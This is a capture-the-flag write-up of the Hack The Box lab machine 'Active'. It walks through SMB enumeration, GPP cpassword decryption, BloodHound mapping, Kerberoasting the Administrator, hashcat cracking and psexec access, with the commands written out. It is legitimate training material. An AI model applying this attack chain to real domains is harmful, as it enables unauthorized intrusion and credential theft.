---
description: >-
  Walkthrough of the HTB machine "Active", perfect for testing Active Directory
  skills.
cover: >-
  https://images.unsplash.com/photo-1545987796-200677ee1011?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwxfHxuZXR3b3JrfGVufDB8fHx8MTcwOTU3NjkzNXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# 💻 Active

## Scanning

Let's start with the usual Nmap scan:

```bash
nmap -T4 -A 10.10.10.100 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 15:26 -03
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 1s
| smb2-time: 
|   date: 2024-03-04T18:28:50
|_  start_date: 2024-03-04T18:26:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.15 seconds
```



## Enumeration

First, we can start Enumerating the SMB Shares to check if we're able to have access to any file shares as anonymous users:

```bash
smbclient -L \\\\10.10.10.100\\ -N

# -L = list shares
# -N = no password
```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption><p>Anonymous login shows us all the file shares on the target</p></figcaption></figure>

Here we can see two unusual File Shares that we can use to enumerate further. However, we don't have access to it as anonymous users. We can list all the File Shares we have access to with this command:

```basic
smbmap -u '' -p '' -H 10.10.10.100
```

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption><p>Anonymous users have access to the "Replication" File Share</p></figcaption></figure>

As anonymous users, we only have read access to the "Replication" File Share. We can try enumerating further:

```bash
smbclient \\\\10.10.10.100\\Replication -N
```

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>Directory inside the File Share</p></figcaption></figure>

After enumerating, we can see a "_Groups.xml_" file in the following Directory: `\active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>Groups.xml file</p></figcaption></figure>

## Exploitation

If we look at the contents of this file, we'll see a username and a "_cpassword"_:

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption><p>Username and cpassword found</p></figcaption></figure>

Now, we'll need to decrypt this "_cpassword_" to perform a GPP Attack. We can do this by using a tool called "_gpp-decrypt"_.

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption><p>Plain Text Password</p></figcaption></figure>

Now that we have credentials, we can try using them with "_smbmap_" one more time, to find out if this user has access to any other shares:

```bash
smbmap -u 'SVC_TGS' -p '<password>' -H 10.10.10.100
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption><p>This user has access to other File Shares</p></figcaption></figure>

### User Flag

As we can see, our recently obtained credentials show us that the SVC\_TGS user has read access to the "Users" File Share.

If we navigate through this File Share and access SVC\_TGS's Desktop, we'll see the user flag there.



## Privilege Escalation / Post Exploitation

### Enumeration

After the exploitation phase, we'll have to do enumeration once again so we know how to escalate our privileges in Active Directory.

We can start by using the "_bloodhound-python_" ingestor to get more information about the target.

To do this, let's create a new folder called "bloodhound" so our files stay more organized.

```bash
# Create a directory called bloodhound and enter it.
mkdir bloodhound
cd bloodhound

# Use the ingestor with the credentials we have to get more information about the domain
bloodhound-python -d active.htb -u svc_tgs -p <password> -ns 10.10.10.100 -c all 
    # -d = domain
    # -u = user
    # -p = password
    # -ns = name server
    # -c all = collect everything
```

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption><p><em>bloodhound-python</em> performing enumeration</p></figcaption></figure>

Now, we can upload all the data collected by the ingestor in "_BloodHound_" so we can have a better visual of how the Domain is built:

```bash
# We first need to start neo4j
sudo neo4j console

# Then we can start bloodhound
sudo bloodhound
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption><p>Upload the data collected to BloodHound</p></figcaption></figure>

With all the data uploaded, we can try seeing if we can perform Kerberoasting in any accounts in the domain.

A Kerberoasting attack happens when an user wants to access an Application Server and makes requests to the KDC (Key Distribution Center), A.K.A, the Domain Controller (DC). To do this, the user requests a TGT (Ticket Granting Ticket) to the Domain Controller, and receives back a TGT encrypted with a Kerberos TGT (krbtgt) hash.

After that, the User will request a Ticket Granting Service (TGS) to the KDC presenting its TGT. The KDC will reply back providing the TGS encrypted with the server's account hash. This way, the Kerberoasting attack happens when we get the TGS and decrypt the server's account hash.

Let's see if there are any Kerberoastable accounts in this Domain:

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption><p>Administrator is a Kerberoastable user</p></figcaption></figure>

As we can see, the Administrator account is a Kerberoastable, which means we can grab the Administrator's hash just by performing a Kerboroasting attack.

To perform this Kerberoasting attack we'll do the following:

```bash
GetUserSPNs.py active.htb/svc_tgs:<password> -dc-ip 10.10.10.100 -request
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p>Administrator's hash</p></figcaption></figure>

Now we just need to crack this hash.&#x20;

To crack a Kerberos hash, we'll use "_hashcat_" with the mode of 13100:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption><p>Cracked Administrator Password</p></figcaption></figure>



### Root Flag

Once we have the Administrator's password, we can simply navigate to his desktop using "_psexec"_ and grab the root flag:

```bash
psexec.py active.htb/administrator:'<password>'@10.10.10.100
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption><p>Root Flag</p></figcaption></figure>

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
